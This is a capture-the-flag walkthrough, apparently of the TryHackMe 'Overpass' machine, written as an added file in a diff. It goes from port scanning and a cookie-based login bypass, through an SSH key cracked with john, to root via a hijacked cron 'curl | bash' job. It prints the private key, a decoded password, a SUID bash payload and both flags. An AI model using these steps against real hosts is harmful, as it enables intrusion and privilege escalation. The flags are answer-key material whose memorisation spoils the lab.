@@ -1,0 +1,255 @@
+i used nmap to scan ports 
+
+$ nmap -vv ip
+
+i found 2 ports which are
+port 80 and port 22
+http and ssh
+
+then i use dirsearch to find some hidden directories
+
+then i found this dirs
+/admin
+/admin/?/login
+/login.js
+
+then theres a login page in /admin and /admin/?login
+and when go to http://ip/login.js
+i do some enumeration then i found this
+
+========================================================
+} else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+}
+========================================================
+
+so i use cookie editor
+then set a cookie named " SessionToken " and its value is "asdfasdf" 
+so basicaly the value i put is random
+then i tried to refresh the page then i found this
+
+
+=======================================================
+
+
+
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+===========================================================
+
+then i copy sa ssh private key then i saved it as ssh.key
+then i use ssh2john so i can crack the 
+password using john or john the ripper 
+
+$ python /usr/share/john/ssh2john.py ssh.key > james_key
+$ john james_key --wordlist=/usr/share/wordlists/rockyou.txt
+
+then i got the password of the ssh key
+password: james13
+
+then i ssh to james using the private key
+
+$ ssh -i ssh.key james@ip
+
+then it tells me to enter the password 
+so i enter " james13 "
+and it error's
+because the key didnt work because its permission too public/open
+then i change the " ssh.key " permission using chmod
+
+$ chmod 600 ssh.key
+
+then i tried to connect to ssh again
+
+$ ssh -i ssh.key james@ip
+Enter ssh key password: james13
+
+then we are now logged in as james
+then i type " ls " then found these
+=============================================
+james@overpass-prod:~$ ls
+todo.txt  user.txt
+============================================
+then i cat the user flag
+
+james@overpass-prod:~$ cat user.txt
+thm{65c1aaf000506e56996822c6281e6bf7}
+
+then here is the flag
+
+user flag: thm{65c1aaf000506e56996822c6281e6bf7}
+
+then i tried to "ls -la"
+then i found this file named ".overpass"
+so i cat it
+then it gives me this hash
+
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+
+so by its form or like pattern i can say that it was "rot" bat idk what number
+so i tried to decode it with:
+rot1
+rot13
+rot47
+
+then the rot 47 decrypt it and gives me this: 
+
+===============================
+
+[{"name":"System","pass":"saydrawnlyingpicture"}]
+
+===============================
+
+so i tried to su on james
+and it works , means that was the password of the account james
+
+user: james
+password: saydrawnlyingpicture
+
+then i upload linpease
+
+then i saw this
+
+==========================================
+
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+/etc/hosts
+==========================================
+
+means i can modify the /etc/hosts
+then i nano /etc/hosts 
+then i saw this
+
+=========================================
+
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+=========================================
+
+so in that linpease i found the ***** root curl overpass.thm....
+then i change the ip of the " overpass.thm " in " /etc/host " into my openvpn ip
+
+it will look like this: 
+
+=================================
+
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+your_openvpn_ip overpass.thm
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+=================================
+
+then i saved it
+
+// NOTE! my machine / your machine, not on your targets machine or on James machine
+
+i go back to my machine and create a decoy of what i found in linpease which is:
+/downloads/src/buildscript.sh
+
+here the command in my terminal:
+$ mkdir www
+$ cd www
+$ mkdir /downloads/src
+$ cd downloads/src
+$ nano buildscript.sh
+
+so in nano i created a command the would give us permission to /bin/bash
+this is what i typed in nano:
+note! the equal is not include, i just used it to separate/separation
+
+===============================
+#!/bin/bash
+chmod +s /bin/bash
+
+================================
+
+what you see above is what i typed in the " buildscript.sh " file
+
+then i cd to the www folder i created
+
+$ cd ..
+$ cd ..
+
+then when im the www folder i created 
+i started a port 80 server using python
+
+$ python -m SimpleHTTPServer 80
+
+which is denied UwU
+
+so i try again with root permission , i can execute it as root because im on my machine
+
+$ sudo python -m SimpleHTTPServer 80
+
+then it worked! xD
+
+then i go the james machine or the target machine
+then i this is what i type:
+
+$ /bin/bash -p
+
+then viola!! we got root!!
+
+then go to root dir then cat root.txt 
+
+# cd /root
+# ls
+# cat root.txt
+
+root flag: thm{7f336f8c359dbac18d54fdd64ea753bb}
+
+then we got the flaggggggggggggg!!!!!!
+
